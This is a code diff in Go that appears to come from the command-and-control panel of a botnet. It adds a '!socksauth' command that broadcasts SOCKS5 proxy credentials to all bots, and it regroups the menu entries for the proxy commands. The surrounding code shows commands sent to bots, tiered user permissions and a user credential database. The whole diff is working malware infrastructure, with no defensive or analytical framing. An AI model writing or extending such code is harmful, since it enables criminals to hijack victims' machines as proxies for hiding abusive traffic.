@@ -257,13 +257,21 @@ func (c *client) writeBotManagement(conn net.Conn) {
 // db: Displays all user credentials from users.json
 // !socks: Establishes SOCKS5 proxy through bots for traffic tunneling
 // !stopsocks: Terminates active proxy connections
+func (c *client) writeSocksCommands(conn net.Conn) {
+	commands := []string{
+		"║  \033[1;35mSOCKS5 Proxy\033[1;97m                                ║",
+		"║    !socks <port>      - Start SOCKS5 proxy on port          ║",
+		"║    !stopsocks         - Stop SOCKS5 proxy                   ║",
+		"║    !socksauth <u> <p> - Set proxy username & password       ║",
+	}
+	c.writeSection(conn, commands)
+}
+
 func (c *client) writePrivateCommands(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                             ║",
 		"║    private            - Show private commands                ║",
 		"║    db                 - Show user database                   ║",
-		"║    !socks <port>      - Establish SOCKS5 reverse proxy       ║",
-		"║    !stopsocks         - Terminate proxy connections          ║",
 	}
 	c.writeSection(conn, commands)
 }
@@ -621,6 +629,18 @@ func handleRequest(conn net.Conn) {
 					}
 					sendToBots("!stopsocks")
 					conn.Write([]byte("\033[1;35mSOCKS5 proxy stop command sent to all bots\r\n\033[0m"))
+
+				case "!socksauth":
+					if !c.canUseShell() {
+						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
+						continue
+					}
+					if len(parts) < 3 {
+						conn.Write([]byte("Usage: !socksauth <username> <password>\r\n"))
+						continue
+					}
+					sendToBots(fmt.Sprintf("!socksauth %s %s", parts[1], parts[2]))
+					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 auth updated (user: %s) on all bots\r\n\033[0m", parts[1])))
 
 				case "!info":
 					if !c.canUseBotManagement() {
